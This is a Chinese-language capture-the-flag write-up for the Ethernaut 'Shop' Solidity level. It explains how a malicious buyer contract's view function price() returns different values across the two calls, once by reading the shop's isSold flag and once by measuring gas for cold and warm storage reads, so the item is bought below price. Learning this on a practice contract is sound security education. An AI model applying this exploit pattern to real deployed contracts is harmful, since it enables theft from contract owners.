# Shop

## 题目描述

[原题链接](https://ethernaut.openzeppelin.com/level/0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842)

以低于要求的价格从商店买到商品.

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Shop -vvvvv
```

## 功能简述

只要两次调用price的结果不同即可。view函数不能修改变量，只能读取变量。但如果某一变量进行了改变，view函数是不会检查的

```solidity
function buy() public {
	Buyer _buyer = Buyer(msg.sender);

	if (_buyer.price() >= price && !isSold) {
		isSold = true;
		price = _buyer.price();
	}
}
```

`Shop合约`的`buy函数`在两次`price()`调用中改变了`isSold`的值，所以我们可以通过`isSold`的具体值而返回不同的价格以使用更低的价格购买。

```solidity
function price() external view returns (uint256) {
	if (Shop(shop).isSold()) {
		return 0;
	} else {
		return 200;
	}
}
```



sload操作码会根据插槽的冷暖收取不同的gas值。

> If the accessed address is warm, the dynamic cost is 100. Otherwise the dynamic cost is 2100. See section [access sets](https://www.evm.codes/about).

```solidity
function price() external view returns (uint256) {
	uint256 gasleftBefore = gasleft();
	justcostGas + 1;
	if (gasleftBefore - gasleft() >= 2000) {
		return 200;
	} else {
		return 0;
	}
}
```

